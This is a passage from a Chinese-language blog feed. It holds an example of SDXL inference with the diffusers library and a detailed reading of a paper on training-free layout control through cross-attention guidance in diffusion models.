class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DiffusionPipeline</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># load both base &amp; refiner</span></span><br><span class="line">base = DiffusionPipeline.from_pretrained(</span><br><span class="line">    <span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16, variant=<span class="string">&quot;fp16&quot;</span>, use_safetensors=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">base.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">refiner = DiffusionPipeline.from_pretrained(</span><br><span class="line">    <span class="string">&quot;stabilityai/stable-diffusion-xl-refiner-1.0&quot;</span>,</span><br><span class="line">    text_encoder_2=base.text_encoder_2,</span><br><span class="line">    vae=base.vae,</span><br><span class="line">    torch_dtype=torch.float16,</span><br><span class="line">    use_safetensors=<span class="literal">True</span>,</span><br><span class="line">    variant=<span class="string">&quot;fp16&quot;</span>,</span><br><span class="line">)</span><br><span class="line">refiner.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define how many steps and what % of steps to be run on each experts (80/20) here</span></span><br><span class="line">n_steps = <span class="number">40</span></span><br><span class="line">high_noise_frac = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&quot;A majestic lion jumping from a big stone at night&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># run both experts</span></span><br><span class="line">image = base(</span><br><span class="line">    prompt=prompt,</span><br><span class="line">    num_inference_steps=n_steps,</span><br><span class="line">    denoising_end=high_noise_frac,</span><br><span class="line">    output_type=<span class="string">&quot;latent&quot;</span>,</span><br><span class="line">).images</span><br><span class="line">image = refiner(</span><br><span class="line">    prompt=prompt,</span><br><span class="line">    num_inference_steps=n_steps,</span><br><span class="line">    denoising_start=high_noise_frac,</span><br><span class="line">    image=image,</span><br><span class="line">).images[<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 <code>torch &gt;= 2.0</code> 时，可以使用 torch.compile 将推理速度提高 20-30%。在运行流水线之前，用 torch 编译简单包装 unet：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipe.unet = torch.<span class="built_in">compile</span>(pipe.unet, mode=<span class="string">&quot;reduce-overhead&quot;</span>, fullgraph=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果受 GPU VRAM 限制，可以通过调用 <code>pipe.enable_model_cpu_offload</code> 而不是 <code>.to(&quot;cuda&quot;)</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- pipe.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">+ pipe.enable_model_cpu_offload()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="6-任务实现"><a href="#6-任务实现" class="headerlink" title="6 任务实现"></a>6 任务实现</h1><p>之前把代码放在一个py文件中跑的，但是每次跑都要加载模型，突然想到可以放在jupyter中跑，还能可视化生成的内容，如下：</p><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_L8tSxQloLv.png"></p><p>现在正在推理，一开始打算用之前的云服务器，但是由于要访问抱抱脸，云服务器不知道怎么连外网，就先用自己电脑跑了，但是GPU都跑红了。</p><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_pynG8B_yq8.png"></p><p>不过现在起码CPU利用率还好，不是很卡，GPU红就红吧，我还能干点别的。</p>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 夏令营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读2：Training-Free Layout Control with Cross-Attention Guidance</title>
      <link href="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/"/>
      <url>/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1 Abstract"></a>1 Abstract</h1><p>最近基于扩散的生成器可以从文本提示生成高质量的图像。然而，他们经常忽略指定组合空间布局的文本指令。我们提出了一种实现鲁棒布局控制的简单方法，而不需要对图像生成器进行训练或微调。我们的技术操纵模型使用的交叉注意力层来连接文本和视觉信息，并在给定的期望方向上引导生成，例如用户指定的布局。</p><p>为了确定如何最好地指导注意力，我们研究了注意力图的作用，并探索两种替代策略：前向和后向指导。我们在三个基准上彻底评估了我们的方法，并对两种策略进行了比较分析，证明了后向引导与前向引导以及先前的工作相比的优越性。我们通过将布局引导扩展到编辑真实图像布局和上下文等应用程序来进一步演示布局引导的通用性。</p><hr><h1 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2 Introduction"></a>2 Introduction</h1><p>生成 AI 是过去几年出现的最具创新性的技术之一。在计算机视觉中，新的文本到图像生成方法，如<code>DALL-E</code>[37]、<code>Imagen</code>[43]和<code>Stable Diffusion</code>[39]，已经证明机器能够生成足够高质量的图像，用于许多应用，提高专业艺术家和非专业人士的生产力。</p><p>然而，尽管取得了这一成功，但图像生成的许多实际应用，特别是在专业环境中，都需要这种方法所缺乏的高水平控制。基于语言的图像生成器中的规范是文本的；虽然文本可以利用庞大的高级概念库，但它不是表达图像中细粒度视觉细微差别的好工具。具体来说，文本往往不足以描述作文的确切布局。</p><p>事实上，如之前的工作[16]所示，最先进的图像生成器很难正确解释通过文本指定的简单布局指令。例如，当用“猫左边的狗”这样的短语提示此类模型时，“猫左边”的关系并不总是在生成的图像中准确描绘出来。事实上，这种性质的提示往往会导致模型产生错误的语义，例如猫狗混合体的图像。这种限制因不寻常的组合而加剧，例如“房子顶上的马”，这超出了模型在训练过程中观察到的典型组合。</p><p>我们的工作更好地理解了这一局限性，并提出了一种克服它的机制。为此，我们介绍了一种方法，该方法无需对图像生成器进行进一步训练即可实现布局控制，同时仍能保持生成图像的质量。</p><p>我们注意到，虽然布局不能通过文本提示轻松控制，但可以直接干预交叉注意力层，通过用户指定的输入（如边界框）将生成引导到选择的方向，我们称之为布局指导。我们考虑并比较了这种干预的两种替代策略：“正向指导”和“反向指导”。</p><ul><li>正向引导直接使交叉注意力层偏移到所需模式中的激活，让模型通过迭代应用其去噪步骤来结合引导。</li><li>我们的主要贡献是反向引导，它使用反向传播来更新图像延迟，通过能量最小化来匹配所需的布局。</li></ul><p>虽然布局控制已经受到了一些关注，但一些方法遵循了正向范式[2, 45]，我们表明反向引导是一种更有效的机制。然后，我们的第二个贡献是深入研究了图像生成过程中影响布局的因素，揭示了正向制导的缺点，并讨论了反向制导如何解决这些问题。我们发现，虽然不同概念与其视觉范围之间存在直观的相关性，但这种相关性比人们想象的要微妙得多，而且，也许与直觉相反，即使是提示中的特殊标记（开始标记和填充标记）也有助于塑造布局。</p><p>最后，我们展示了我们的反向引导优于现有方法，并无缝集成到真实图像布局编辑等应用程序中。</p><hr><h1 id="3-Related-Work"><a href="#3-Related-Work" class="headerlink" title="3 Related Work"></a>3 Related Work</h1><h2 id="3-1-文本到图像生成"><a href="#3-1-文本到图像生成" class="headerlink" title="3.1 文本到图像生成"></a>3.1 文本到图像生成</h2><p>多年来，生成对抗网络（<code>GANs</code>）[17]一直是从文本提示生成图像的主要方法[38, 48, 51, 56-58]。也考虑了文本的替代表示，如场景图[25]。</p><p>最近，研究重点转移到文本条件自回归[10, 14, 37, 55]和扩散模型[18, 32, 36, 39, 43]上，在生成具有出色保真度的图像方面取得了令人印象深刻的结果，同时避免了常见的<code>GAN</code>陷阱，如训练不稳定和模式崩溃[9]。数据规模[44]和变压器模型[35]的大小和功能的大幅增加在实现这一转变方面发挥了至关重要的作用。通常，这些模型被设计为接受文本提示作为输入，这可能会对准确传达图像的所有细节构成挑战。</p><p>当提示时间较长或描述非典型场景时，这个问题会加剧。最近的研究表明，无分类器指导[21]在提高带有输入提示的生成可信度方面是有效的。其他则专注于提高组合性，例如，通过将多个扩散模型与不同的运算符组合[30]，以及属性绑定[5, 13]。</p><h2 id="3-2-图像生成中的布局控制"><a href="#3-2-图像生成中的布局控制" class="headerlink" title="3.2 图像生成中的布局控制"></a>3.2 图像生成中的布局控制</h2><p>具有空间条件的图像生成与布局控制密切相关，通常通过边界框或语义图完成[12, 33, 46, 47, 52, 60]。这些方法不使用文本提示，而是依赖于闭集词汇表来生成图像，即训练分布的标签（例如COCO[29]）。最近的图像文本模型，如CLIP[35]，现在能够扩展到开放词汇表。然而，仅通过文本传达一篇作文的精确布局仍然具有挑战性；即便如此，图像生成器的空间保真度也极其有限[16]。因此，还考虑了文本和布局的联合条件[14, 20, 24]以及从文本预测布局[22]。</p><p>最近的研究[1, 2, 4, 6, 27, 45, 50, 53]提出用空间调节来扩展最先进的稳定扩散[39]。<code>GLIGEN</code>[27]和<code>ReCo</code>[53]分别使用门控自我注意层和额外的区域标记对扩散模型进行微调。其他作品[2, 4, 6, 45, 50]遵循无训练的方法。<code>MultiDiffusion</code>[4]采用了[30]中的思想，结合了掩蔽噪声。<code>eDiffI</code>[2]和<code>HFG</code>[45]与我们的前瞻性指导有相似的想法，直接干预交叉注意力。然而，他们忽视了特殊代币在这一过程中的重要性。在我们工作的同时，<code>ZestGuide</code>[6]和<code>BoxDiff</code>[50]提出计算交叉注意力损失以实现布局控制，这更接近我们的反向引导。与之前的工作不同，我们使用了一个不依赖于用户提供的精确分割掩模的目标函数，并对影响布局的因素进行了深入分析，从而对正向和反向策略的行为进行了分析。最后，在扩散的基础上，最近的一些作品展示了从各种其他调节信号[3, 23, 59]（如深度或边缘图）生成可控图像。</p><h2 id="3-3-基于扩散的图像编辑"><a href="#3-3-基于扩散的图像编辑" class="headerlink" title="3.3 基于扩散的图像编辑"></a>3.3 基于扩散的图像编辑</h2><p>上述大多数方法缺乏控制或编辑已生成图像的能力，甚至缺乏编辑真实图像的能力。例如，简单地更改原始提示中的单词通常会导致完全不同的生成。这可以通过为感兴趣的对象提供或生成掩码来规避[7, 32]。Prompt to Prompt[19]利用大多数最先进架构中存在的交叉注意力层将单词标记与生成图像的空间布局联系起来的事实，通过简单的基于文本的编辑来解决这个问题。基于文本的图像编辑也可以通过单图像模型微调来实现[26,49]。然而，这些方法虽然在语义编辑实体方面取得了成功，但只能就地应用这些编辑，而不允许编辑空间布局本身。</p><hr><h1 id="4-Method"><a href="#4-Method" class="headerlink" title="4 Method"></a>4 Method</h1><p>我们考虑了布局引导文本到图像生成的问题。基于文本的图像生成器允许从条件分布$p(x|y)$中采样图像$x\in R^3×H\times W$，其中$y$是语言描述。</p><p>给定一个现成的生成器，我们希望在不进行进一步训练或微调的情况下，将其输出调整为与生成的组合的所需布局相匹配。换句话说，我们的目标是研究预训练的文本到图像生成器是否可以在推理过程中遵守用户指定的布局，而无需经过显式布局条件训练。在最简单的情况下，给定文本提示$y$、文本提示中单词$y_i$的索引$i$和边界框$B$，我们想生成一个在$B$内包含$y_i$的图像$x$，本质上是修改生成器，使其通过额外的控件从新的分布$p(x|y,B,i)$中采样。</p><h2 id="4-1-准备工作：Stable-Diffusion"><a href="#4-1-准备工作：Stable-Diffusion" class="headerlink" title="4.1 准备工作：Stable Diffusion"></a>4.1 准备工作：Stable Diffusion</h2><p>我们首先简要回顾了Stable Diffusion(SD)[39]的技术细节，这是一个公开可用的、最先进的文本到图像生成器，代表了基于扩散的重要图像生成器类别[37, 39, 43]。SD 由图像编码器和解码器、文本编码器和在潜在空间中运行的去噪网络组成。</p><p>文本编码器$Y&#x3D; \phi(y) $将输入提示映射到固定维度$ Y\in R^{N \times M}$的张量。这是通过将起始符号 <code>[SoT]</code> 添加到$y$并在最后附加$N-|y|-1$个填充符号<code>[EoT]</code>来工作，总共获得$N$个符号。然后，实现为大型语言模型<code>(LLM)</code>的函数$\phi$将填充的单词序列作为输入，并生成对应的令牌序列$Y_i \in R^M$，其中$ i ∈ {1,…,N }$作为输出。</p><p>虽然对我们的讨论并不重要，但 SD 的编码网络$h$将图像$x$映射到相应的潜在代码$z&#x3D;h(x)\in R^{4 \times \frac{H}{s} \times \frac{W}{s}}$，其中 $s$ 划分$H$和$W$。函数$h$是一个具有左逆$h^*$的自动编码器，使得$x &#x3D; h^∗ ◦ h(x)$。该组件的主要目的是用建模$p(z | y)$的问题替换建模$p(x | y)$的问题，降低空间分辨率$s$倍。</p><p>SD的一个关键组成部分是迭代条件去噪网络D。该网络经过训练以输出潜在代码 z 的条件样本 $z ∼ p(z | y)$。它的目的是以噪声样本$z_t&#x3D;\alpha_tz+\sqrt{1-\alpha_t}\epsilon_t$为输入，其中$\epsilon_t$为正态分布噪声，$\alpha_t$为递减序列，从$α_0≈1$到$α_T≈0$，表示噪声调度。然后，网络 D 返回噪声样本 $z_t$ 的估计：$D(z_t, y, t) ≈ ε_t$。</p><p>为了对图像进行采样，首先采样正态分布的$z_T$并迭代地应用 D 以获得中间代码 $z_{T-1},…, z_1, z_0 ≈ z$。最后，$z$通过图像解码器$x &#x3D; h∗(z)$转换回图像。</p><p>SD 架构的最后一个方面与我们的工作相关。虽然有几个设计选择使网络 D 在实践中运行良好，但我们感兴趣的机制是交叉注意力，它连接视觉和文本信息并允许生成过程以文本为条件。每个交叉注意力层以中间特征张量$z^{(γ)} ∈ R^{C× \frac{H}{r} × \frac{W}{r}}$作为输入，其中$γ$是网络中相关层的索引，$r$是定义该表示级别的空间分辨率的比例因子。交叉注意力图$A(γ)$关联每个空间位置$u ∈ {1,…,\frac{H}{r}} × {1,…,\frac{W}{r}}$到由 $i ∈ {1,…,N}$：</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image.png"></p><p>其中值$V^{(γ)}_i$和键$K^{(γ)}_i$是文本编码器提供的令牌嵌入$Y_i$的线性变换，$Q^{(γ)}$是$z^{(γ)}$的线性变换，$a^{(γ)}_u$是交叉注意力层的输出。</p><h2 id="4-2-布局指导"><a href="#4-2-布局指导" class="headerlink" title="4.2 布局指导"></a>4.2 布局指导</h2><p>像 SD 这样的文本到图像生成器很难准确解释文本提供的布局指令。因此，我们引入了一种方法，通过从具有附加控制的分布$  p(x |y, B, i)  $中采样来指导生成过程期间的布局。例如，对应于所选文本标记$y_i$的用户指定的边界框$B$，这可以通过操纵架构中某些交叉注意力层中的注意力响应来实现。</p><p>已经表明，交叉注意力层调节生成图像的空间布局[19]。具体来说，$A_{ui}^{(γ)}$ 决定了层$γ$中每个位置$u$与$N$个文本标记$y_i$中的每一个相关联的强度。由于每个空间位置$u$的关联强度$\sum_{i&#x3D;1}^{N} A_{u i}^{(\gamma)}&#x3D;1$的总和，因此不同的标记可以被视为位置“竞争”。为了使用对应于令牌$y_i$的边界框$B$来控制图像布局，可以偏向注意力，使得目标框内的位置$u∈B$与$y_i$密切相关（而其他位置则不是）。如下所述，这可以在不微调图像生成器或训练附加层的情况下完成。</p><p>接下来，我们对两种策略进行了全面调查，以实现无训练布局控制：前向和后向引导（图 2）。虽然最近在最近的工作 [2, 45] 中已经讨论了前向引导的实例，但我们在此形式化了这种方法，确定了它的局限性，并提出了后向引导作为更有效的替代方案。</p><h3 id="4-2-1-前向指导"><a href="#4-2-1-前向指导" class="headerlink" title="4.2.1 前向指导"></a>4.2.1 前向指导</h3><p>在前向引导中，边界框B被表示为平滑窗口函数$g_{u}^{(\gamma)}$，它等于盒子内的常数$c&gt;0$，并且很快下降到外部的零。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_G1S4K8zeM4.png"></p><blockquote><p>图2：两种布局引导策略概述。所选单词标记的交叉注意力图用红色边框标记。在前向引导中，单词、开始和结束标记的交叉注意力图在空间上是有偏差的。在后向引导中，我们改为计算损失函数并在推理过程中执行反向传播以优化潜在。</p></blockquote><p>我们对窗口函数进行缩放，使$∥g(γ)∥_1&#x3D;1$。然后，我们通过用以下公式替换交叉注意图来偏置交叉注意图：</p><p>$$<br>A_{u i}^{(\gamma)} \leftarrow(1-\lambda) A_{u i}^{(\gamma)}+\lambda g_{u}^{(\gamma)} \sum_{v} A_{v i}^{(\gamma)}<br>$$</p><p>其中$λ ∈ [0, 1]$定义了干预的强度。在实践中，我们对上述公式的右侧进行归一化，沿文本标记维度使用<code>softmax</code>函数，保持逐像素注意的总和等于1。注意上述公式只操纵第$i$个token的交叉注意映射$A_{:, i}^{(\gamma)}$，并且窗口由质量$\sum_{v} A_{v i}^{(\gamma)}$加权，使后者保持不变。</p><p>该干预应用于所选层$γ∈Γ$上去噪网络$D$的多次迭代。这意味着每个选定层计算的激活图按照等式独立修改。</p><p>一个关键的分析表明，前向引导是一种简单的方法，它受到固有约束的影响，阻碍了其提供有效布局控制的能力。正如我们在第 3.3 节中讨论的那样，这主要是由于在生成过程中影响布局的各种因素，包括文本标记之间的空间依赖性和初始噪声中的空间信息“隐藏”。</p><h3 id="4-2-2-反向指导"><a href="#4-2-2-反向指导" class="headerlink" title="4.2.2 反向指导"></a>4.2.2 反向指导</h3><p>为了解决前向引导的缺点，我们引入了一种替代机制，我们称之为反向引导。我们不是在反向引导中直接操纵注意力图，而是通过引入能量函数来偏置注意力：</p><p>$$<br>E\left(A^{(\gamma)}, B, i\right)&#x3D;\left(1-\frac{\sum_{u \in B} A_{u i}^{(\gamma)}}{\sum_{u} A_{u i}^{(\gamma)}}\right)^{2}<br>$$</p><p>优化该函数鼓励第$i$个标记的交叉注意力图获得$B$指定的区域内的更高值。具体来说，在降噪器$D$的每个应用中，当评估层$  γ ∈ Γ  $时，上述公式的损失的梯度通过反向传播计算以更新潜在$z_{t}\left(\equiv z_{t}^{(0)}\right)$：</p><p>$$<br>z_{t} \leftarrow z_{t}-\sigma_{t}^{2} \eta \nabla_{z_{t}} \sum_{\gamma \in \Gamma} E\left(A^{(\gamma)}, B, i\right)<br>$$</p><p>其中$  η &gt; 0  $是控制引导强度的比例因子，$\sigma_{t}&#x3D;\sqrt{\left(1-\alpha_{t}\right) &#x2F; \alpha_{t}}$。通过更新潜在的，所有标记的交叉注意力图受到后向指导的间接影响。为了生成图像，我们在梯度更新和去噪步骤之间交替。</p><h2 id="4-3-分析与讨论"><a href="#4-3-分析与讨论" class="headerlink" title="4.3 分析与讨论"></a>4.3 分析与讨论</h2><p>接下来，我们详细介绍了前向和反向策略之间的比较分析。为了激发反向指导和理解其有效性，我们阐明了所有标记的重要性以及初始噪声在生成过程中塑造布局的影响。</p><h3 id="4-3-1-Word-Tokens"><a href="#4-3-1-Word-Tokens" class="headerlink" title="4.3.1 Word Tokens"></a>4.3.1 Word Tokens</h3><p>一个重要的考虑因素是，由于自注意力，文本编码器在处理提示时融合了来自不同单词的信息。这导致“语义重叠”：来自一个token的信息由另一个token编码。换句话说，文本嵌入同时捕获特定于单词和上下文信息，例如主谓宾依赖关系。然后通过交叉注意力层将这种重叠从文本编码器转移到扩散过程中，从而产生空间重叠。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_O4idCETNVb.png"></p><blockquote><p>图3：前向和后向引导过程中的交叉注意力图。不同单词之间的空间依赖性对前向引导产生负面影响，而后向引导软鼓励所有依赖标记匹配所需的布局。</p></blockquote><p>图3中的示例说明了不同单词的交叉注意力图中的这种重叠。它还显示了为短语“两个攀爬者”提供空间条件时前向和后向引导的行为。很明显，条件短语的注意力图与其他词（“climbing”、“a”）的空间依赖关系之间的不匹配导致前向指导忽略布局条件。相反，后向引导在必要时间接驱动所有注意力图朝向布局条件，因为它作用于潜在部分。</p><h3 id="4-3-2-Special-Tokens"><a href="#4-3-2-Special-Tokens" class="headerlink" title="4.3.2 Special Tokens"></a>4.3.2 Special Tokens</h3><p>另一个关键发现是<code>[SoT]</code>和<code>[EoT]</code>标记的交叉注意力图与输入文本中的内容词不对应，仍然携带显着的语义和布局信息。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_d9lBXNSVtJ.png"></p><blockquote><p>图4：生成过程中不同文本提示的交叉注意力图。表明开始<code>[SoT]</code>和填充<code>[EoT]</code>标记携带丰富的语义和布局信息。</p></blockquote><p>如图 4 所示，<code>[EoT]</code>标记的交叉注意力图对应于生成图像中的显着区域，即通常是文本提示中单个语义实体的并集。<code>[SoT]</code>的行为与<code>[EoT]</code>互补，强调背景。为了使前向引导有效，因此不仅需要干预选定的内容标记，还需要干预特殊内容标记。我们使用输入框的并集作为<code>[EoT]</code>的指导，对<code>[SoT]</code>则相反。然而，我们凭经验发现，这有时会导致过于激进的指导，这会损害图像保真度。另一方面，后向引导不会受到这些缺点的影响，因为它进行潜在的优化，我们在补充中进一步讨论这一点。</p><h3 id="4-3-3-Initial-Noise"><a href="#4-3-3-Initial-Noise" class="headerlink" title="4.3.3 Initial Noise"></a>4.3.3 Initial Noise</h3><p>最后，扩散过程的初始噪声在塑造图像的布局方面起着重要作用。我们凭经验观察到噪声包含内在布局；例如，当使用相同的种子用“狗的图像”和“猫的图像”等短语提示模型时，它会生成布局一致的图像，将狗和猫放在相同的位置。我们在补充中提供了示例，具有接近用户给出的固有布局的初始噪声更容易优化并导致更高的保真度。</p><p>因此，选择与所需布局一致的噪声模式可以进一步提高指导的有效性。在后向引导中，应用于交叉注意力图的损失实际上可以加倍作为初始噪声选择的度量。具体来说，我们对不同的噪声模式进行采样并评估方程。&#x20;</p><p>$$<br>E\left(A^{(\gamma)}, B, i\right)&#x3D;\left(1-\frac{\sum_{u \in B} A_{u i}^{(\gamma)}}{\sum_{u} A_{u i}^{(\gamma)}}\right)^{2}<br>$$</p><p>上述公式在对几个步骤应用后向引导后，这使我们能够选择最佳对齐的初始噪声。有关详细结果，请参阅补充材料。</p><h3 id="4-3-4-Forward-vs-Backward"><a href="#4-3-4-Forward-vs-Backward" class="headerlink" title="4.3.4 Forward vs Backward"></a>4.3.4 Forward vs Backward</h3><p>总之，前向和后向引导使用不同的机制来操纵交叉注意力。前向引导直接修改交叉注意力以符合规定的模式，这对于许多去噪迭代重复“强制”。虽然它不会产生任何额外的计算成本，但它很难提供对布局的稳健控制，因为非引导标记可能会导致生成偏离所需模式。相比之下，后向引导使用损失函数来评估注意力是否遵循所需的模式。虽然比前向引导慢，但后向引导更加细化，因为它间接鼓励所有标记（引导和非引导标记）通过潜在更新遵守布局。</p><h2 id="4-4-真实图像布局编辑"><a href="#4-4-真实图像布局编辑" class="headerlink" title="4.4 真实图像布局编辑"></a>4.4 真实图像布局编辑</h2><p>布局指导可以与建立在基于扩散的图像生成器的其他技术相结合。我们证明这对于真实图像编辑的任务。为此，我们将后向引导合并到两种方法中，这两种方法通常用于给定真实图像的扩散模型的个性化，即文本反转 (TI) [15] 和 <code>Dreambooth</code>[42]。TI通过优化概念的可学习文本标记$⟨∗⟩$，将现有的图像生成器扩展为给定一个或几个图像的新概念作为示例。<code>Dreambooth</code>试图通过微调预训练的文本到图像模型来捕获特定主题的外观，其中有几个图像可用。然后，可以生成学习概念的新图像。</p><p>这两种方法都不支持对新生成的图像进行局部空间控制；它们的编辑通常是全局和语义的。为此，我们对<code>Dreambooth-finetuned</code>模型和<code>TI-optimized</code>令牌作为提示的一部分应用反向指导。这使我们能够控制生成图像的布局，同时保留由$⟨∗⟩$表示的原始对象的身份。</p><hr><h1 id="5-Experiments"><a href="#5-Experiments" class="headerlink" title="5 Experiments"></a>5 Experiments</h1><p>在本节中，我们评估了我们的无训练布局指导方法，定量比较前向和后向引导的变体，并在三个基准上提供与之前和并发工作的比较。</p><h2 id="5-1-实验环境"><a href="#5-1-实验环境" class="headerlink" title="5.1 实验环境"></a>5.1 实验环境</h2><h3 id="5-1-1-实现细节"><a href="#5-1-1-实现细节" class="headerlink" title="5.1.1 实现细节"></a>5.1.1 实现细节</h3><p>我们利用在<code>LAION-5B</code>数据集[44]上训练的稳定扩散(SD) V-1.5[39]作为默认的预训练图像生成器，如果没有指定。有关架构和噪声调度器的详细描述，请参阅补充。</p><p>$$<br>A_{u i}^{(\gamma)} \leftarrow(1-\lambda) A_{u i}^{(\gamma)}+\lambda g_{u}^{(\gamma)} \sum_{v} A_{v i}^{(\gamma)}<br>$$</p><p>对于前向指导，我们将上述公式应用于扩散过程的前40步去噪网络的每一层，设$λ &#x3D; 0.8$。对于后向指导，我们计算中块交叉注意图和去噪网络上采样分支的第一个块(U-Net[41])的损失，因为我们发现这是平衡控制和保真度的最佳设置。我们默认设置$η &#x3D; 30$，但发现$  30\sim50  $之间的值在大多数设置中运行良好。由于生成图像的布局通常在推理的早期阶段建立，因此在扩散过程的初始 10 步中执行反向指导，并在每一步重复 5 次。</p><h3 id="5-1-2-评估基准"><a href="#5-1-2-评估基准" class="headerlink" title="5.1.2 评估基准"></a>5.1.2 评估基准</h3><p>我们在三个基准上定量评估我们的方法：<code>VISOR</code>[16]、<code>COCO 2014</code>[29]和<code>Flickr30K</code>实体[34,54]。我们讨论了 supp 中数据集使用伦理问题。<code>VISOOR</code>提出了量化文本到图像模型空间理解能力的指标。对于<code>COCO 2014</code>，我们遵循先前工作 [4] 采用的相同设置，它每张图像仅使用注释对象的子集。最后，我们引入 <code>Flickr30K</code>实体数据集作为评估布局控制的另一个基准，因为它包含具有视觉基础的图像-标题对，补充材料中提供了所有基准和指标的详细信息。</p><h2 id="5-2-前向与后向指导"><a href="#5-2-前向与后向指导" class="headerlink" title="5.2 前向与后向指导"></a>5.2 前向与后向指导</h2><blockquote><p>表 1：前向 (<code>FG</code>) 和后向 (<code>BG</code>) 策略的比较，包括噪声选择 (NS)。<code>FG</code>∗：前向引导包括 <code>[SoT]</code> 和 <code>[EOT]</code> 标记。我们随机抽取了 1000 个文本提示，并基于<code>VISOOR</code>[16] 计算指标。</p></blockquote><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_xQP02vNwdu.png"></p><p>首先，我们使用具有 1000 个随机选择的文本样本的<code>VISOR</code>协议比较表 1 中的两种不同引导模式（前向和后向）。前向引导的最大优点是计算开销可以忽略不计，从而导致更快的推理时间。然而，我们观察到，与 (unguided) SD 相比，前向引导并没有显着提高对象精度 (<code>OA</code>)，而后向机制产生明显更高的 <code>OA</code>。在评估生成的空间关系（VISOR 条件&#x2F;无条件指标）方面，前向和后向引导都获得了比 SD 基线更好的结果。我们还发现，包含 <code>[SoT]</code> 和 <code>[EoT]</code> 标记改进了前向引导，这证实了我们在第 4.3 节中的分析和见解，但后向引导仍然实现了卓越的性能。最后，使用后向引导进行噪声选择在所有指标上都提供了显着提升。</p><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_-azLfniKyL.png"></p><blockquote><p>图 5：前向和后向引导之间的比较，包括开始和结束标记的指导。</p></blockquote><p>我们在图 5 中提供了前向和后向机制的定性比较，包括特殊标记对前向引导的影响。后向引导在生成的对象和输入边界框之间实现了更好的对齐，它还有助于解决扩散模型中生成的图像偶尔会省略对象的问题。</p><h2 id="5-3-与先前工作的比较"><a href="#5-3-与先前工作的比较" class="headerlink" title="5.3 与先前工作的比较"></a>5.3 与先前工作的比较</h2><blockquote><p>表 2：基于 VISOR [16] 协议的后向引导（我们的）与文本到图像生成模型的比较。</p></blockquote><p><img src="/2024/08/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB2%EF%BC%9ATraining-Free-Layout-Control-with-Cross-Attention-Guidance/image_wxEulC8HVj.png"></p><p>在表 2 中，我们将我们的方法与不使用布局控制的文本到图像生成方法进行比较。我们注意到比较是公平的，因为在此设置 (VISOR) 中，指导不需要手动用户输入（见补充）。我们的方法在 <code>VISORcond</code>指标下表现出卓越的性能，与基线相比 (SD) 实现了 95.95% 的准确度和更高的 <code>OA</code>。尽管 <code>OA</code>没有直接评估布局，但改进可以通过非引导 SD 经常无法在非典型组合中生成正确的语义这一事实来解释。我们还注意到，虽然<code>DALLE-v2</code>[36] 总体上实现了最高的<code>OA</code>，但与 SD 相比，布局指令似乎更难，如<code>VISORcond</code>分数较低所示。</p><blockquote><p>表3：与其他布局到图像模型进行比较。我们的方法提高了空间保真度（由更高的 <code>AP/mAP</code> 分数建议）。<code>mAP</code>以0.3的<code>IoU</code>阈值计算</p></blockquote><p><img 